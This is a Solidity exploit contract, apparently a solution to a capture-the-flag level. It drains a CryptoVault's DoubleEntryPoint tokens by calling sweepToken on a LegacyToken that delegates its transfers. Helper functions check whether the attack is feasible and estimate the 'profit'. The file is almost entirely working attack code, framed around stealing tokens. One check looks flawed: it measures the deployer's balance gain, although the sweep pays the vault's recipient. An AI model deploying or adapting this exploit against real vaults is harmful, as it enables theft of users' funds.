// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./DoubleEntryPoint.sol";

/**
 * @title DoubleEntryPointExploit
 * @notice Standard Solidity exploit for the DoubleEntryPoint delegation vulnerability
 * @dev Demonstrates the basic attack vector by triggering vault.sweepToken(legacyToken)
 * 
 * ATTACK EXPLANATION:
 * 1. The CryptoVault has tokens (both LegacyToken and DoubleEntryPoint)
 * 2. LegacyToken delegates all transfers to DoubleEntryPoint via delegateTransfer()
 * 3. When vault.sweepToken(legacyToken) is called:
 *    a. Vault calls legacyToken.transfer(recipient, balance)
 *    b. LegacyToken delegates to doubleEntryPoint.delegateTransfer(recipient, balance, vault)
 *    c. DoubleEntryPoint transfers tokens FROM vault TO recipient
 * 4. This drains the vault's DoubleEntryPoint tokens, not just the LegacyToken balance
 * 
 * The key insight: sweepToken() thinks it's transferring LegacyToken, but actually
 * transfers DoubleEntryPoint tokens due to the delegation mechanism.
 */
contract DoubleEntryPointExploit {
    CryptoVault public immutable vault;
    LegacyToken public immutable legacyToken;
    DoubleEntryPoint public immutable doubleEntryPoint;
    address public immutable attacker;

    event ExploitExecuted(uint256 stolenAmount);
    event VaultDrained(address indexed vault, address indexed recipient, uint256 amount);

    /**
     * @notice Initialize the exploit contract
     * @param vaultAddress Address of the CryptoVault to exploit
     * @param legacyTokenAddress Address of the LegacyToken
     * @param doubleEntryPointAddress Address of the DoubleEntryPoint token
     */
    constructor(address vaultAddress, address legacyTokenAddress, address doubleEntryPointAddress) {
        vault = CryptoVault(vaultAddress);
        legacyToken = LegacyToken(legacyTokenAddress);
        doubleEntryPoint = DoubleEntryPoint(doubleEntryPointAddress);
        attacker = msg.sender;
    }

    /**
     * @notice Execute the exploit to drain the vault
     * @dev Calls vault.sweepToken(legacyToken) which triggers the delegation vulnerability
     */
    function exploit() external {
        require(msg.sender == attacker, "Only attacker can execute");

        // Get initial balances for comparison
        uint256 vaultBalanceBefore = doubleEntryPoint.balanceOf(address(vault));
        uint256 attackerBalanceBefore = doubleEntryPoint.balanceOf(attacker);

        // Execute the attack: call sweepToken on the legacy token
        // This will trigger the delegation mechanism and drain the vault's DoubleEntryPoint tokens
        vault.sweepToken(IERC20(address(legacyToken)));

        // Calculate stolen amount
        uint256 vaultBalanceAfter = doubleEntryPoint.balanceOf(address(vault));
        uint256 attackerBalanceAfter = doubleEntryPoint.balanceOf(attacker);
        uint256 stolenAmount = attackerBalanceAfter - attackerBalanceBefore;

        // Emit events for monitoring
        emit ExploitExecuted(stolenAmount);
        emit VaultDrained(address(vault), attacker, stolenAmount);

        // Verify the attack succeeded
        require(vaultBalanceAfter < vaultBalanceBefore, "Vault was not drained");
        require(stolenAmount > 0, "No tokens were stolen");
    }

    /**
     * @notice Check if the exploit is possible
     * @return possible True if the exploit can be executed
     * @return reason Explanation of why the exploit may fail
     */
    function canExploit() external view returns (bool possible, string memory reason) {
        // Check if vault has DoubleEntryPoint tokens
        uint256 vaultBalance = doubleEntryPoint.balanceOf(address(vault));
        if (vaultBalance == 0) {
            return (false, "Vault has no DoubleEntryPoint tokens");
        }

        // Check if LegacyToken delegates to DoubleEntryPoint
        if (address(legacyToken.delegate()) != address(doubleEntryPoint)) {
            return (false, "LegacyToken does not delegate to DoubleEntryPoint");
        }

        // Check if vault's underlying token is set to DoubleEntryPoint
        if (address(vault.underlying()) != address(doubleEntryPoint)) {
            return (false, "Vault underlying is not DoubleEntryPoint");
        }

        return (true, "Exploit is possible");
    }

    /**
     * @notice Get the current state of the exploit setup
     * @return vaultBalance Current DoubleEntryPoint balance of the vault
     * @return legacyDelegate Current delegate of the LegacyToken
     * @return vaultUnderlying Current underlying token of the vault
     */
    function getExploitState() external view returns (
        uint256 vaultBalance,
        address legacyDelegate,
        address vaultUnderlying
    ) {
        vaultBalance = doubleEntryPoint.balanceOf(address(vault));
        legacyDelegate = address(legacyToken.delegate());
        vaultUnderlying = address(vault.underlying());
    }

    /**
     * @notice Calculate potential profit from the exploit
     * @return potentialProfit Amount of tokens that could be stolen
     */
    function calculatePotentialProfit() external view returns (uint256 potentialProfit) {
        // The profit is the vault's DoubleEntryPoint balance
        return doubleEntryPoint.balanceOf(address(vault));
    }
}